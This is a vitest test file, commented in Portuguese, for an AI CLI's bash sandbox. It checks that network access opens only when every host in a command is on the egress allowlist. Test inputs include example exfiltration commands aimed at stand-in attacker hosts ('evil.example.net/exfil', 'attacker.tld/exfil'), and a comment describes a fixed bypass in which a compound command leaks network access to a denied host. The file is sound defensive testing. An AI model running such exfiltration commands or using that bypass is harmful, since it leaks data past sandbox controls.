// EST-1020 · ADR-0065 §8.2 (P1, APR-0087) · ADR-0060 (CLI-SEC-5) — a REDE do sandbox
// de bash abre SÓ via a POLÍTICA DE EGRESS da catraca (não mais `network:false` fixo).
//
// Prova o CAMINHO real da decisão (sem mockar a política a ponto de não testar nada):
//   - a função `egressAllows` injetada no `NodeShellPort` é construída do MESMO
//     `EgressAllowlist` da catraca (o wiring real faz idêntico) — a política NÃO é
//     reimplementada, é consultada;
//   - o `NodeShellPort` deriva `network` SÓ dessa função e o passa ao `spawnConfined`
//     do lançador. Um FAKE de lançador CAPTURA o `network` que recebeu.
//
// (a) `ls` (sem host) ⇒ network===false (invariante (d): sem destino, sem rede).
// (b) comando com host PERMITIDO pela política ⇒ network===true (`--share-net`).
// (c) comando com host NEGADO pela política ⇒ network===false (default-deny: roda
//     confinado, o connect falha dentro do sandbox).
// (d) NÃO-REGRESSÃO do net-deny: o lançador REAL (`buildBwrapArgs`) só emite
//     `--share-net` quando `network:true`; com `network:false` o `--unshare-all`
//     permanece sem `--share-net` (socket inalcançável).
//
// INEGOCIÁVEL (ADR §13.1/§6): rede NUNCA aberta fora da política de egress REAL;
// default continua deny; comando sem host de rede ⇒ network:false.

import { describe, expect, it } from 'vitest';
import { mkdtempSync, rmSync } from 'node:fs';
import { spawn, type ChildProcess } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { SandboxConfinement, SandboxDecision, SandboxSpawnResult } from '@hiperplano/aluy-cli-core';
import { NodeShellPort } from '../../src/io/shell-port.js';
import { NodeWorkspace } from '../../src/io/workspace.js';
import { EgressAllowlist } from '../../src/io/egress.js';
import { BwrapSandboxLauncher } from '../../src/sandbox/index.js';

// A MESMA construção do wiring real (session/wiring.ts): a função pura de egress
// consulta o `EgressAllowlist` — host PERMITIDO ⇒ true; sem host / host fora ⇒ false.
function egressFn(egress: EgressAllowlist): (command: string) => boolean {
  return (command: string): boolean => {
    const inspection = egress.inspect(command);
    return inspection.hasNetwork && !inspection.outsideAllowlist;
  };
}

/**
 * FAKE de lançador (subclasse do REAL p/ herdar os asserts de fronteira): NÃO monta
 * bwrap — só CAPTURA o `network` que o shell-port pediu e devolve um processo trivial
 * (`/bin/echo`) p/ a `exec` resolver limpo. `decide()` é forçado a `confine` p/ o
 * caminho de confinamento (onde o `network` é lido) rodar em QUALQUER máquina (mesmo
 * sem bwrap real no CI).
 */
class CapturingLauncher extends BwrapSandboxLauncher {
  networkSeen: boolean | undefined;

  constructor() {
    super({
      capability: { platform: 'linux', userns: true, bwrap: true, landlock: false, seccomp: true },
      env: 'dev',
    });
  }

  override decide(): SandboxDecision {
    return { action: 'confine', confined: true, allowed: true, promotable: true };
  }

  override spawnConfined(
    _command: readonly string[],
    confinement: SandboxConfinement,
  ): SandboxSpawnResult<ChildProcess> {
    // É AQUI que o invariante vive: o `network` veio do shell-port, que o derivou SÓ
    // da função de egress. Capturamos exatamente o que ele decidiu.
    this.networkSeen = confinement.network ?? false;
    const child = spawn('/bin/echo', ['ok'], { stdio: ['ignore', 'pipe', 'pipe'] });
    return { decision: this.decide(), process: child };
  }
}

describe('EST-1020 — rede do sandbox sob a política de egress (P1)', () => {
  function setup(): { ws: string; egress: EgressAllowlist; launcher: CapturingLauncher } {
    const ws = mkdtempSync(join(tmpdir(), 'aluy-net-ask-'));
    // Política REAL com um host extra PERMITIDO explícito (DADO de config). O
    // default-deny da allowlist barra qualquer OUTRO host.
    const egress = new EgressAllowlist({ allow: ['exemplo-liberado.com'] });
    return { ws, egress, launcher: new CapturingLauncher() };
  }

  function shellWith(
    ws: string,
    egress: EgressAllowlist,
    launcher: CapturingLauncher,
  ): NodeShellPort {
    return new NodeShellPort({
      workspace: new NodeWorkspace({ root: ws }),
      sandboxLauncher: launcher,
      egressAllows: egressFn(egress),
      killGraceMs: 20,
    });
  }

  it('(a) comando SEM host (`ls`) ⇒ network===false (invariante d)', async () => {
    const { ws, egress, launcher } = setup();
    try {
      await shellWith(ws, egress, launcher).exec('ls -la');
      expect(launcher.networkSeen).toBe(false);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(b) host PERMITIDO pela política ⇒ network===true', async () => {
    const { ws, egress, launcher } = setup();
    try {
      // `exemplo-liberado.com` está na allowlist (DADO de config) ⇒ rede abre.
      await shellWith(ws, egress, launcher).exec('curl https://exemplo-liberado.com/pkg.tgz');
      expect(launcher.networkSeen).toBe(true);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(b2) host da própria Aluy (default-allow) ⇒ network===true', async () => {
    const { ws, egress, launcher } = setup();
    try {
      // `aluy.app` nasce na allowlist (broker/identity) — rede abre sem config extra.
      await shellWith(ws, egress, launcher).exec('curl https://api.aluy.app/v1/quota');
      expect(launcher.networkSeen).toBe(true);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(c) host NEGADO pela política ⇒ network===false (default-deny)', async () => {
    const { ws, egress, launcher } = setup();
    try {
      // `evil.example.net` NÃO está na allowlist ⇒ rede NÃO abre (o connect falhará
      // confinado). Mesmo que o comando rode, o sandbox NÃO ganha rede p/ um destino
      // fora da política de egress.
      await shellWith(ws, egress, launcher).exec('curl https://evil.example.net/exfil');
      expect(launcher.networkSeen).toBe(false);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(c2) SEM `egressAllows` injetado ⇒ network===false p/ QUALQUER comando (default-deny)', async () => {
    const { ws, launcher } = setup();
    try {
      // Sem a função de egress (default), a rede do sandbox NUNCA abre — nem p/ um
      // host que a política permitiria. Idêntico ao `network:false` fixo do pré-P1.
      const shell = new NodeShellPort({
        workspace: new NodeWorkspace({ root: ws }),
        sandboxLauncher: launcher,
        killGraceMs: 20,
      });
      await shell.exec('curl https://aluy.app/whatever');
      expect(launcher.networkSeen).toBe(false);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(e) SEC-SBX-NET-1: comando COMPOSTO (host permitido + host NEGADO) ⇒ network===false', async () => {
    const { ws, egress, launcher } = setup();
    try {
      // O FURO que o gate AG-0008 pegou: o `--share-net` vale pro `sh -c <comando>` INTEIRO,
      // então abrir rede pelo 1º host (permitido) vazaria p/ o 2º (negado, que a catraca nem
      // mostra). O fix (default-deny sobre o CONJUNTO de destinos) ⇒ a rede NÃO abre se QUALQUER
      // destino da linha está fora da allowlist. Fail-closed.
      await shellWith(ws, egress, launcher).exec(
        'curl https://exemplo-liberado.com/ok && curl https://attacker.tld/exfil',
      );
      expect(launcher.networkSeen).toBe(false);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(e2) COMPOSTO com TODOS os hosts permitidos ⇒ network===true (não quebra `clone A && clone B`)', async () => {
    const { ws, egress, launcher } = setup();
    try {
      // O fix não é "host único só": se TODOS os destinos são permitidos, a rede abre normal.
      await shellWith(ws, egress, launcher).exec(
        'git clone https://exemplo-liberado.com/a && git clone https://api.aluy.app/b',
      );
      expect(launcher.networkSeen).toBe(true);
    } finally {
      rmSync(ws, { recursive: true, force: true });
    }
  });

  it('(d) NÃO-REGRESSÃO: o lançador REAL só emite --share-net com network:true', () => {
    const real = new BwrapSandboxLauncher({
      capability: { platform: 'linux', userns: true, bwrap: true, landlock: false, seccomp: true },
      env: 'dev',
    });
    const conf = (network: boolean): SandboxConfinement => ({
      workspaceRoots: ['/tmp/ws'],
      cwd: '/tmp/ws',
      network,
    });
    // network:false ⇒ net-deny (--unshare-all sem --share-net).
    const denied = real.buildBwrapArgs(conf(false));
    expect(denied).toContain('--unshare-all');
    expect(denied).not.toContain('--share-net');
    // network:true ⇒ rede aberta (--share-net presente).
    const allowed = real.buildBwrapArgs(conf(true));
    expect(allowed).toContain('--share-net');
  });
});
